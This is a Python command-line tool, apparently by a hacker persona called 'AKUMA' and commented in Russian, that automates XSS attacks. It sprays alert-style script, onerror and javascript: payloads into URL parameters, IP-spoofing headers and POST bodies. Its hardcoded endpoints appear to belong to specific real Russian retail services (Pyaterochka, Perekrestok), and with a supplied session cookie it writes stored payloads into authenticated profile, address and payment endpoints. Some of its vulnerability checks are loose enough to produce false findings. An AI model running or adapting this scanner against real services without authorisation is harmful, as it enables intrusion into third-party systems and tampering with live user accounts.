#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
AKUMA XSS Tester - Автоматизированное тестирование XSS уязвимостей
Создано легендарным AKUMA для тестирования безопасности
"В каждом баге есть фича, в каждой фиче есть баг" - Философия AKUMA
"""

import requests
import urllib.parse
import json
import time
import random
from colorama import Fore, Back, Style, init
import argparse
from concurrent.futures import ThreadPoolExecutor

# Инициализация colorama для красивого вывода
init(autoreset=True)

class AkumaXSSTester:
    def __init__(self, target_url, threads=10, cookies=None, custom_headers=None):
        self.target_url = target_url.rstrip('/')
        self.threads = threads
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:142.0) Gecko/20100101 Firefox/142.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Priority': 'u=0, i',
            'Te': 'trailers',
            'Connection': 'keep-alive'
        })
        
        # Устанавливаем cookie если предоставлены
        if cookies:
            self.session.headers['Cookie'] = cookies
            print(f"{Fore.GREEN}[+] Cookie установлены: {cookies[:100]}...{Style.RESET_ALL}")
            
        # Добавляем дополнительные заголовки
        if custom_headers:
            for header in custom_headers:
                if ':' in header:
                    key, value = header.split(':', 1)
                    self.session.headers[key.strip()] = value.strip()
                    print(f"{Fore.GREEN}[+] Заголовок добавлен: {key.strip()}: {value.strip()[:50]}...{Style.RESET_ALL}")
        
        # Payload наборы для разных типов XSS
        self.dom_payloads = [
            "<img src=x onerror=alert('AKUMA_DOM_XSS')>",
            "<svg onload=alert('DOM_AKUMA')>",
            "javascript:alert('DEEPLINK_XSS')",
            "data:text/html,<script>alert('DATA_URL_XSS')</script>",
            "<iframe src=\"javascript:alert('IFRAME_XSS')\"></iframe>"
        ]
        
        self.stored_payloads = [
            "<script>alert('AKUMA_STORED_XSS')</script>",
            "<img src=x onerror=alert('STORED_XSS')>",
            "\"><script>alert('QUOTE_ESCAPE_XSS')</script>",
            "';alert('SQL_XSS');//",
            "<svg/onload=alert('SVG_STORED')>"
        ]
        
        self.reflected_payloads = [
            "<script>alert('AKUMA_REFLECTED')</script>",
            "<img src=x onerror=alert('REFLECTED_XSS')>",
            "\"><script>alert('HEADER_XSS')</script><!--",
            "<svg onload=confirm('REFLECTED_CONFIRM')>",
            "javascript:alert('URL_REFLECTED')"
        ]
        
        # Специальные хедеры для IP-based XSS
        self.ip_headers = [
            'X-Forwarded-For',
            'X-Real-IP', 
            'X-Client-IP',
            'X-Originating-IP',
            'X-Remote-IP',
            'CF-Connecting-IP'
        ]
        
        self.results = []

    def print_banner(self):
        banner = f"""
{Fore.RED}
    ╔═══════════════════════════════════════════════════════════════╗
    ║  █████╗ ██╗  ██╗██╗   ██╗███╗   ███╗ █████╗     ██╗  ██╗███████╗███████╗
    ║ ██╔══██╗██║ ██╔╝██║   ██║████╗ ████║██╔══██╗     ██║  ██║██╔════╝██╔════╝
    ║ ███████║█████╔╝ ██║   ██║██╔████╔██║███████║     ███████║███████╗███████╗
    ║ ██╔══██║██╔═██╗ ██║   ██║██║╚██╔╝██║██╔══██║     ██╔══██║╚════██║╚════██║
    ║ ██║  ██║██║  ██╗╚██████╔╝██║ ╚═╝ ██║██║  ██║     ██║  ██║███████║███████║
    ║ ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝
    ║                                                                       
    ║                    🔥 XSS TESTER BY LEGENDARY AKUMA 🔥                  
    ║             "Если код не ломается, значит его мало тестируют!"         
    ╚═══════════════════════════════════════════════════════════════╗
{Style.RESET_ALL}
"""
        print(banner)

    def log_result(self, test_type, url, payload, status, response_snippet=""):
        result = {
            'test_type': test_type,
            'url': url,
            'payload': payload,
            'status': status,
            'response': response_snippet[:200] + "..." if len(response_snippet) > 200 else response_snippet
        }
        self.results.append(result)
        
        # Цветной вывод результатов
        status_color = Fore.GREEN if status == "VULNERABLE" else Fore.YELLOW if status == "POTENTIAL" else Fore.RED
        print(f"{status_color}[{status}]{Style.RESET_ALL} {test_type}: {url}")
        if payload:
            print(f"  {Fore.CYAN}Payload:{Style.RESET_ALL} {payload[:100]}{'...' if len(payload) > 100 else ''}")

    def test_dom_xss(self):
        """Тестирование DOM-based XSS в BellNotification и LinksSandbox"""
        print(f"\n{Fore.YELLOW}[*] Тестируем DOM XSS уязвимости...{Style.RESET_ALL}")
        
        dom_endpoints = [
            "/mobile5ka/src/layouts/DefaultLayout/BellNotification/",
            "/mobile5ka/src/pages/TechnicalPages/components/LinksSandbox/",
            "/web-mystery-shopper/join-by-referral.html",
            "/web-mystery-shopper/deep-link.html"
        ]
        
        for endpoint in dom_endpoints:
            for payload in self.dom_payloads:
                test_urls = [
                    f"{self.target_url}{endpoint}#{payload}",
                    f"{self.target_url}{endpoint}?deepLink={urllib.parse.quote(payload)}",
                    f"{self.target_url}{endpoint}?callback={urllib.parse.quote(payload)}"
                ]
                
                for test_url in test_urls:
                    try:
                        response = self.session.get(test_url, timeout=10)
                        
                        # Проверяем отражение payload в ответе
                        if payload.replace("'", '"') in response.text or payload in response.text:
                            self.log_result("DOM XSS", test_url, payload, "VULNERABLE", response.text)
                        elif "javascript:" in response.text or "onerror" in response.text:
                            self.log_result("DOM XSS", test_url, payload, "POTENTIAL", response.text)
                        else:
                            self.log_result("DOM XSS", test_url, payload, "SAFE")
                            
                        time.sleep(0.5)  # Не DDOS'им сервер, мы же культурные хакеры
                        
                    except requests.RequestException as e:
                        print(f"{Fore.RED}[ERROR] {test_url}: {str(e)}{Style.RESET_ALL}")

    def test_stored_xss(self):
        """Тестирование Stored XSS через API endpoints"""
        print(f"\n{Fore.YELLOW}[*] Тестируем Stored XSS уязвимости...{Style.RESET_ALL}")
        
        api_endpoints = [
            "/feeds/edadeal/large",
            "/api/offers",
            "/api/catalogs"
        ]
        
        for endpoint in api_endpoints:
            for payload in self.stored_payloads:
                # POST данные с XSS payload
                post_data = {
                    "catalog": payload,
                    "offers": [payload],
                    "text": payload,
                    "description": payload
                }
                
                try:
                    url = f"{self.target_url}{endpoint}"
                    response = self.session.post(url, json=post_data, timeout=10)
                    
                    # Проверяем ответ на уязвимость
                    if payload in response.text:
                        self.log_result("STORED XSS", url, payload, "VULNERABLE", response.text)
                    elif response.status_code == 200 and "error" not in response.text.lower():
                        self.log_result("STORED XSS", url, payload, "POTENTIAL", response.text)
                    else:
                        self.log_result("STORED XSS", url, payload, "SAFE")
                        
                    time.sleep(1)
                    
                except requests.RequestException as e:
                    print(f"{Fore.RED}[ERROR] {url}: {str(e)}{Style.RESET_ALL}")

    def test_reflected_xss(self):
        """Тестирование Reflected XSS через параметры и хедеры"""
        print(f"\n{Fore.YELLOW}[*] Тестируем Reflected XSS уязвимости...{Style.RESET_ALL}")
        
        # Тестируем через параметры URL
        test_params = ['q', 'search', 'query', 'name', 'id', 'callback', 'jsonp']
        
        for param in test_params:
            for payload in self.reflected_payloads:
                try:
                    url = f"{self.target_url}/status?{param}={urllib.parse.quote(payload)}"
                    response = self.session.get(url, timeout=10)
                    
                    if payload in response.text:
                        self.log_result("REFLECTED XSS", url, payload, "VULNERABLE", response.text)
                    elif "script" in response.text or "onerror" in response.text:
                        self.log_result("REFLECTED XSS", url, payload, "POTENTIAL", response.text)
                    else:
                        self.log_result("REFLECTED XSS", url, payload, "SAFE")
                        
                except requests.RequestException as e:
                    print(f"{Fore.RED}[ERROR] {url}: {str(e)}{Style.RESET_ALL}")

        # Тестируем через хедеры (IP-based XSS)
        for header in self.ip_headers:
            for payload in self.reflected_payloads:
                try:
                    headers = {header: payload}
                    response = self.session.get(f"{self.target_url}/status", 
                                             headers=headers, timeout=10)
                    
                    if payload in response.text:
                        self.log_result("IP HEADER XSS", f"{self.target_url}/status", 
                                      f"{header}: {payload}", "VULNERABLE", response.text)
                        
                except requests.RequestException as e:
                    continue

    def test_dangerously_set_inner_html(self):
        """Тестирование dangerouslySetInnerHTML уязвимостей"""
        print(f"\n{Fore.YELLOW}[*] Тестируем dangerouslySetInnerHTML уязвимости...{Style.RESET_ALL}")
        
        react_endpoints = [
            "/atomic/pages/Trademark",
            "/components/CVM/CurrentOfferCard/",
            "/organisms/catalog/CatalogContentGroup/",
            "/pages/SpecialOffers/components/"
        ]
        
        react_payloads = [
            "<img src=x onerror=alert('REACT_XSS')>",
            "<svg onload=alert('DANGEROUS_HTML')>",
            "<iframe srcdoc=\"<script>alert('SRCDOC_XSS')</script>\">",
            "<input onfocus=alert('INPUT_XSS') autofocus>"
        ]
        
        for endpoint in react_endpoints:
            for payload in react_payloads:
                try:
                    # POST как JSON для React компонентов
                    data = {"text": payload, "content": payload, "html": payload}
                    url = f"{self.target_url}{endpoint}"
                    
                    response = self.session.post(url, json=data, timeout=10)
                    
                    if payload in response.text or "dangerouslySetInnerHTML" in response.text:
                        self.log_result("REACT XSS", url, payload, "VULNERABLE", response.text)
                    
                except requests.RequestException:
                    continue
                    
    def test_authenticated_endpoints(self):
        """Тестирование аутентифицированных endpoint'ов"""
        print(f"\n{Fore.YELLOW}[*] Тестируем аутентифицированные endpoint'ы...{Style.RESET_ALL}")
        
        # Аутентифицированные endpoint'ы на основе структуры Perekrestok
        auth_endpoints = [
            "/profile",
            "/api/user",
            "/api/orders",
            "/api/favorites", 
            "/api/cart",
            "/api/addresses",
            "/api/payment-methods",
            "/api/notifications",
            "/api/loyalty",
            "/cabinet",
            "/dashboard",
            "/settings"
        ]
        
        for endpoint in auth_endpoints:
            for payload in self.reflected_payloads:
                try:
                    # GET запросы с параметрами
                    test_params = ['name', 'comment', 'message', 'note', 'search']
                    for param in test_params:
                        url = f"{self.target_url}{endpoint}?{param}={urllib.parse.quote(payload)}"
                        response = self.session.get(url, timeout=10)
                        
                        if payload in response.text:
                            self.log_result("AUTH REFLECTED XSS", url, payload, "VULNERABLE", response.text)
                        elif response.status_code == 200 and "profile" in response.text.lower():
                            self.log_result("AUTH REFLECTED XSS", url, payload, "POTENTIAL", response.text)
                        else:
                            self.log_result("AUTH REFLECTED XSS", url, payload, "SAFE")
                            
                    # POST запросы для профиля
                    if endpoint in ["/profile", "/api/user", "/settings"]:
                        post_data = {
                            "name": payload,
                            "email": f"test{payload}@example.com",
                            "phone": payload,
                            "address": payload,
                            "note": payload,
                            "comment": payload
                        }
                        
                        try:
                            response = self.session.post(f"{self.target_url}{endpoint}", 
                                                       json=post_data, timeout=10)
                            if payload in response.text:
                                self.log_result("AUTH STORED XSS", f"{self.target_url}{endpoint}", 
                                              payload, "VULNERABLE", response.text)
                            elif response.status_code in [200, 201, 202]:
                                self.log_result("AUTH STORED XSS", f"{self.target_url}{endpoint}", 
                                              payload, "POTENTIAL", response.text)
                        except requests.RequestException:
                            continue
                            
                except requests.RequestException as e:
                    print(f"{Fore.RED}[ERROR] {endpoint}: {str(e)}{Style.RESET_ALL}")
                    
                time.sleep(0.3)  # Не спамим аутентифицированные endpoint'ы

    def generate_report(self):
        """Генерация отчета о найденных уязвимостях"""
        print(f"\n{Fore.CYAN}{'='*70}")
        print(f"                    ОТЧЕТ ОТ AKUMA XSS TESTER")
        print(f"{'='*70}{Style.RESET_ALL}")
        
        vulnerable_count = len([r for r in self.results if r['status'] == 'VULNERABLE'])
        potential_count = len([r for r in self.results if r['status'] == 'POTENTIAL'])
        safe_count = len([r for r in self.results if r['status'] == 'SAFE'])
        
        print(f"\n{Fore.GREEN}Уязвимых: {vulnerable_count}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Потенциально уязвимых: {potential_count}{Style.RESET_ALL}")
        print(f"{Fore.RED}Безопасных: {safe_count}{Style.RESET_ALL}")
        
        if vulnerable_count > 0:
            print(f"\n{Fore.RED}🚨 КРИТИЧНЫЕ УЯЗВИМОСТИ НАЙДЕНЫ! 🚨{Style.RESET_ALL}")
            for result in self.results:
                if result['status'] == 'VULNERABLE':
                    print(f"  {Fore.RED}[!]{Style.RESET_ALL} {result['test_type']}: {result['url']}")
        
        # Сохраняем в файл
        report_file = f"akuma_xss_report_{int(time.time())}.json"
        with open(report_file, 'w', encoding='utf-8') as f:
            json.dump(self.results, f, indent=2, ensure_ascii=False)
        
        print(f"\n{Fore.CYAN}Полный отчет сохранен в: {report_file}{Style.RESET_ALL}")
        print(f"\n{Fore.MAGENTA}\"Помни, братан: каждая уязвимость - это возможность стать лучше!\" - AKUMA{Style.RESET_ALL}")

    def run_all_tests(self, include_authenticated=False):
        """Запуск всех тестов"""
        self.print_banner()
        print(f"{Fore.GREEN}[+] Начинаем тестирование цели: {self.target_url}{Style.RESET_ALL}")
        
        # Запускаем все тесты
        self.test_dom_xss()
        self.test_stored_xss()
        self.test_reflected_xss()
        self.test_dangerously_set_inner_html()
        
        if include_authenticated:
            self.test_authenticated_endpoints()
        
        # Генерируем отчет
        self.generate_report()

def main():
    parser = argparse.ArgumentParser(description='AKUMA XSS Tester - Автоматизированное тестирование XSS')
    parser.add_argument('-u', '--url', required=True, help='Целевой URL для тестирования')
    parser.add_argument('-t', '--threads', type=int, default=10, help='Количество потоков (по умолчанию: 10)')
    parser.add_argument('-c', '--cookie', help='Cookie строка для аутентификации')
    parser.add_argument('-H', '--headers', action='append', help='Дополнительные HTTP заголовки (можно указать несколько раз)')
    parser.add_argument('--dom', action='store_true', help='Тестировать только DOM XSS')
    parser.add_argument('--stored', action='store_true', help='Тестировать только Stored XSS')
    parser.add_argument('--reflected', action='store_true', help='Тестировать только Reflected XSS')
    parser.add_argument('--authenticated', action='store_true', help='Тестировать аутентифицированные endpoint\'ы')
    
    args = parser.parse_args()
    
    tester = AkumaXSSTester(args.url, args.threads, args.cookie, args.headers)
    
    # Если указаны конкретные тесты
    if args.dom or args.stored or args.reflected or args.authenticated:
        tester.print_banner()
        if args.dom:
            tester.test_dom_xss()
        if args.stored:
            tester.test_stored_xss()
        if args.reflected:
            tester.test_reflected_xss()
        if args.authenticated:
            tester.test_authenticated_endpoints()
        tester.generate_report()
    else:
        # Запускаем все тесты (без аутентификации)
        tester.run_all_tests(include_authenticated=args.cookie is not None)

if __name__ == "__main__":
    main()
